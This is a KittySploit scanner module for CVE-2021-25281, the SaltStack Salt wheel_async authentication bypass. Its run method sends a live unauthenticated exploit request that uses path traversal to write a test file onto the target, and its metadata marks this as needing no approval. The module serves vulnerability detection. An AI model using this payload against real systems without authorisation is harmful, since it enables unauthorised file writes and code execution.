#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SaltStack Salt before 3002."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'SaltStack Salt <3002.5 - Auth Bypass Detection',
        'description': 'SaltStack Salt before 3002.5 does not honor eauth credentials for the wheel_async client, allowing attackers to remotely run any wheel modules on the master.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'saltapi', 'rce', 'saltstack', 'unauth', 'vuln', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'http://hackdig.com/02/hack-283902.htm',
            'https://dozer.nz/posts/saltapi-vulns',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-25281',
            'https://github.com/saltstack/salt/releases',
            'https://www.saltstack.com/blog/active-saltstack-cve-announced-2021-jan-21/',
        ],
        'cve': 'CVE-2021-25281',
    }

    def run(self):
        path = '/run'
        r = self.http_request(method='POST', path=path, allow_redirects=False, headers={'Content-Type': 'application/json'}, data='{"client":"wheel_async","fun":"pillar_roots.write","data":"testing","path":"../../../../../../../tmp/testing","username":"1","password":"1","eauth":"pam"}\n')
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_all = ('return', 'tag', 'jid', 'salt', 'wheel',)
        if all(m in body for m in body_all):
            self.set_info(severity='critical', reason='SaltStack Salt <3002.5 - Auth Bypass detected', path=path)
            return True
        return False

